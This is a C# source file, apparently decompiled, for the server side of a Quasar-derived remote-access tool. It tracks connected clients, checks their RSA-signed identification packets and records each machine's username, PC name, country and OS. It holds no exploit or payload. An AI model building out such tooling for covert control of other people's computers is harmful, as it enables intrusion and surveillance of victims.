

using InvokedCommon.Cryptography;
using InvokedCommon.Messages;
using InvokedCommon.Networking;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;


namespace InvokedServer.Networking
{
	public class QuasarServer : Server
	{
		public Client[] ConnectedClients
		{
			get
			{
				return ((IEnumerable<Client>)this.Clients).Where<Client>((Func<Client, bool>)(c => c != (Client)null && c.Identified)).ToArray<Client>();
			}
		}

		public event QuasarServer.ClientConnectedEventHandler ClientConnected;

		private void OnClientConnected(Client client)
		{
			if (this.ProcessingDisconnect || !this.Listening)
				return;
			QuasarServer.ClientConnectedEventHandler clientConnected = this.ClientConnected;
			if (clientConnected == null)
				return;
			clientConnected(client);
		}

		public event QuasarServer.ClientDisconnectedEventHandler ClientDisconnected;

		private void OnClientDisconnected(Client client)
		{
			if (this.ProcessingDisconnect || !this.Listening)
				return;
			QuasarServer.ClientDisconnectedEventHandler clientDisconnected = this.ClientDisconnected;
			if (clientDisconnected == null)
				return;
			clientDisconnected(client);
		}

		public QuasarServer(X509Certificate2 serverCertificate)
		  : base(serverCertificate)
		{
			this.ClientState += new Server.ClientStateEventHandler(this.OnClientState);
			this.ClientRead += new Server.ClientReadEventHandler(this.OnClientRead);
		}

		private void OnClientState(Server server, Client client, bool connected)
		{
			if (connected || !client.Identified)
				return;
			this.OnClientDisconnected(client);
		}

		private void OnClientRead(Server server, Client client, IMessage message)
		{
			if (message.GetType() == typeof(PluginStarted))
				client.Identified = true;
			if (!client.Identified)
			{
				if (message.GetType() == typeof(ClientIdentification))
				{
					client.Identified = this.IdentifyClient(client, (ClientIdentification)message);
					if (client.Identified)
					{
						client.Send<ClientIdentificationResult>(new ClientIdentificationResult()
						{
							Result = true
						});
						this.OnClientConnected(client);
					}
					else
						client.Disconnect();
				}
				else
					client.Disconnect();
			}
			else
				MessageHandler.Process((ISender)client, message);
		}

		private bool IdentifyClient(Client client, ClientIdentification packet)
		{
			if (packet.Id.Length != 64)
				return false;
			client.Value.Version = packet.Version;
			client.Value.OperatingSystem = packet.OperatingSystem;
			client.Value.AccountType = packet.AccountType;
			client.Value.Country = packet.Country;
			client.Value.CountryCode = packet.CountryCode;
			client.Value.Id = packet.Id;
			client.Value.Username = packet.Username;
			client.Value.PcName = packet.PcName;
			client.Value.Tag = packet.Tag;
			client.Value.ImageIndex = packet.ImageIndex;
			client.Value.EncryptionKey = packet.EncryptionKey;
			try
			{
				return ((RSACryptoServiceProvider)this.ServerCertificate.PublicKey.Key).VerifyHash(Sha256.ComputeHash(Encoding.UTF8.GetBytes(packet.EncryptionKey)), CryptoConfig.MapNameToOID("SHA256"), packet.Signature);
			}
			catch
			{
				return false;
			}
		}

		public delegate void ClientConnectedEventHandler(Client client);

		public delegate void ClientDisconnectedEventHandler(Client client);
	}
}